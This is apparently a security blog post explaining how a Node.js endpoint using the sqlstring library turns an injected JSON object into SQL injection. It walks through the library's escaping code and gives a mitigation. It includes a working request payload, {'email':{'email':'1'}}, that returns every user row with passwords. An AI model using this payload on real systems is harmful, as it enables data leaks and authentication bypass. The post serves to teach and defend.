---
layout: default
title: "Object Injection to SQL Injection"
date: 2021-05-26
---

<nav>
  <ul>
    <li><a href="/">Home</a></li>
    <li><a href="/about/">About</a></li>
    <li><a href="/posts/">Posts</a></li>
  </ul>
</nav>

# Object Injection to SQL Injection

Node.js + sqlstring

In this section we explain an interesting case of SQL injection: a possible scenario, details of the issue, potential impacts, and mitigations.

- What is Object Injection?
    

> Object Injection is an application-level vulnerability that can allow an attacker to trigger different types of malicious behavior — such as code injection, SQL injection, path traversal, or application denial of service — depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized. (OWASP)

- What is SQL Injection?
    

> A SQL injection attack consists of inserting or “injecting” an SQL query through client-supplied input into an application. (OWASP)

## Brief scenario

While analyzing an application during one of our tests, we observed unusual behavior for certain SQL injection payloads, although nothing we tried was directly exploitable. We then tried sending the parameter as an object to see how the application would handle it — that’s when the issue manifested.

The environment performs email validation and returns the data of the responsible person:

```js
POST /email
Host: localhost
Content-Type: application/json

{"email":"guest@example.com"}

--------------------------------

HTTP/1.1 200 OK
content-type: application/json

{
  "error": false,
  "data": [
    {
      "name": "guest",
      "password": "1234",
      "email": "guest@example.com"
    }
  ]
}
```

In this case the endpoint deserializes the provided value as an object instead of converting it to a string; an attacker can therefore craft an object payload that returns all rows from the table, for example:

```js
POST /email
Host: localhost
Content-Type: application/json

{"email":{"email":"1"}}

--------------------------------

HTTP/1.1 200 OK
content-type: application/json

{
  "error": false,
  "data": [
    {
      "name": "admin",
      "password": "admin",
      "email": "admin@example.com"
    },
    {
      "name": "guest",
      "password": "1234",
      "email": "guest@example.com"
    }
  ]
}
```

When analyzing the results, it is possible to check the data exposure of other users whose email does not match. This was due to the failure of object injection in conjunction with sql injection, which caused a “confusion” in the SQL query, responding with all values.

## Details

To detail the previous scenario, we have to think about the sql query formed by the database:

MYSQL

```sql
SELECT * FROM \`users\` WHERE email = ?
```

So, when receiving an email, the database returns all the attributes from the user table, but where is the “confusion” going to happen when providing an object instead of a value?

Everything will happen in the most common dependency for all nodejs libraries that communicate with the mysql database, the library called sqlstring.

_Simple SQL escape and format for MySQL_ [https://github.com/mysqljs/sqlstring](https://web.archive.org/web/20230402051059/https://github.com/mysqljs/sqlstring)

---

## Note:

Before going into, it is important to mention that the developer was called and he defined this information as something that should be treated by the application that uses the library, as a validation of the inputs.

---

The sql string library has the escape function, which will perform a treatment for some characters, so if we pass any of these as payloads, a treatment will occur preventing the common sql injection:

```javascript
var ID_GLOBAL_REGEXP    = /\`/g;
var QUAL_GLOBAL_REGEXP  = /\./g;
var CHARS_GLOBAL_REGEXP = /[\0\b\t\n\r\x1a\"\'\\]/g; // eslint-disable-line no-control-regex
var CHARS_ESCAPE_MAP    = {
  '\0'   : '\\0',
  '\b'   : '\\b',
  '\t'   : '\\t',
  '\n'   : '\\n',
  '\r'   : '\\r',
  '\x1a' : '\\Z',
  '"'    : '\\"',
  '\''   : '\\\'',
  '\\'   : '\\\\'
};
```

But if we pass an object everything will be different, look it:

```javascript
SqlString.escapeId = function escapeId(val, forbidQualified) {
  if (Array.isArray(val)) {
    var sql = '';

    for (var i = 0; i < val.length; i++) {
      sql += (i === 0 ? '' : ', ') + SqlString.escapeId(val[i], forbidQualified);
    }

    return sql;
  } else if (forbidQualified) {
    return '\`' + String(val).replace(ID_GLOBAL_REGEXP, '\`\`') + '\`';
  } else {
    return '\`' + String(val).replace(ID_GLOBAL_REGEXP, '\`\`').replace(QUAL_GLOBAL_REGEXP, '\`.\`') + '\`';
  }
};
```

On the last return, he put the key of our object inside `` being as follows `key`. Because the escapeId function is called by objectToValues, the return will have an additional:

```javascript
return SqlString.objectToValues(val, timeZone);
```

```javascript
SqlString.objectToValues = function objectToValues(object, timeZone) {
  var sql = '';

  for (var key in object) {
    var val = object[key];

    if (typeof val === 'function') {
      continue;
    }

    sql += (sql.length === 0 ? '' : ', ') + SqlString.escapeId(key) + ' = ' + SqlString.escape(val, true, timeZone);
  }

  return sql;
};
```

So, if we pass a simple object like {“a”: “b”}, the return according to the code sequence will be:

```sql
\`a\`="b"
```

So taking as an example the previous query to the bank, the “logic” for results will be modified, it will analyze if the result is true/false:

```sql
SELECT * FROM \`users\` WHERE \`email\` = \`a\` = "b"
```

Column a does not exist in the users table, and returns an error, but if we provide an existing column as email and the value 1, we will have the expected result:

```sql
SELECT * FROM \`users\` WHERE \`email\` = \`email\` = "1"
```

## Impact

Unlike the other sql injections, the impact of this will depend on the query, but the attacker is able to make leaks of table contents, as already seen, bypass authentication and enumerate columns.

**This case has been seen in several github repositories!**

## Mitigation

As we can see, this flaw depends on the application allowing an object to reach the query, this being avoided, it will prevent sql injection. At first the objective is to remove the passage of the non-sanitized element into the query, a good way to handle this user input would be through JSON.stringfy, which will turn the content into a string, thus avoiding other errors.